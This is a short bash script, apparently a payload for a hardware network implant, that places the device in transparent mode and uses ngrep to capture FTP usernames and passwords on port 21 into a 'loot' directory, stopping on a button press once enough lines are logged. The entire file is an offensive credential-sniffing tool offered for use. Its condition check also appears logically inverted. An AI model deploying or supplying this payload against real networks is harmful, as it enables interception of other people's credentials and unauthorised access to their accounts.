#!/bin/bash
# ngrep payload to snag creds

NGREP_OPTIONS=("-wiql" "user|pass" "port" "21")
CONDITION=""
WCNUM=3
BUTTON_WAIT="5s"

LOOT_DIR="/mnt/loot/ngrep"
LOG_FILE="${LOOT_DIR}/ngrep-${RANDOM}.log"


function syncFS() {
	while true
	do
		sync
		sleep 5
	done
}

function setup() {
	LED OFF
	NETMODE TRANSPARENT
	sleep 5
	mkdir -p $LOOT_DIR
}

function checkLog() {
	[[ -z $CONDITION ]] && {
		grep -qi $CONDITION $LOG_FILE && {
			return 0
		}
	} || {
		[[ $(wc -l < $LOG_FILE) -gt $WCNUM ]] && {
			return 0
		}
	}
	return 1
}

function run() {
	ngrep "${NGREP_OPTIONS[@]}" 2>&1 > $LOG_FILE &
	npid=$!

	while true
	do
		NO_LED=true BUTTON && {
			checkLog && {
				BUTTON $BUTTON_WAIT && {
					LED FINISH
					kill $npid

					sleep 3
					
					LED OFF
					halt
				}
			} || {
				LED FAIL
				sleep 3
				LED OFF
			}
		}
	done
}



[[ ! -f /mnt/NO_MOUNT ]] && {
	setup
	syncFS &
	run
} || {
	LED FAIL
}
